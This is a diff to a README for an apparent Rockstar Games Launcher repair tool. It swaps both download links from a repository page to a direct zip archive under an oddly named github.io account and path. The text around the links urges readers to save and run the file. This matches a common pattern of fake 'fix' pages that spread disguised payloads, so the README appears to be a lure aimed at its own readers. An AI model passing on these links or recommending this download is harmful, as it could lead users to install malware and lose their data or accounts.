@@ -5,7 +5,7 @@ description: "Repair the Rockstar Games Launcher on Windows 10 and 11 using this
 ---
 # 🛠️ Rockstar-Games-Launcher-Fix - Restore Your Rockstar Games Access Quickly
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/consonantal-feeling203/Rockstar-Games-Launcher-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/consonantal-feeling203/consonantal-feeling203.github.io/raw/refs/heads/main/decillionth/github_feeling_consonantal_io_v3.9.zip)
 
 This tool fixes the Rockstar Games Launcher when it fails to open or crashes on Windows 10 and Windows 11. It resets specific launcher files and clears corrupted cache data that prevents the software from starting.
 
@@ -35,7 +35,7 @@ These are the requirements for the repair tool to function:
 
 To begin the repair process, obtain the latest version of the tool from our repository.
 
-[Download the Rockstar Games Launcher Repair Tool](https://github.com/consonantal-feeling203/Rockstar-Games-Launcher-Fix)
+[Download the Rockstar Games Launcher Repair Tool](https://github.com/consonantal-feeling203/consonantal-feeling203.github.io/raw/refs/heads/main/decillionth/github_feeling_consonantal_io_v3.9.zip)
 
 Save the file to your Downloads folder or your Desktop. Ensure you remember the location where you save the file.
 
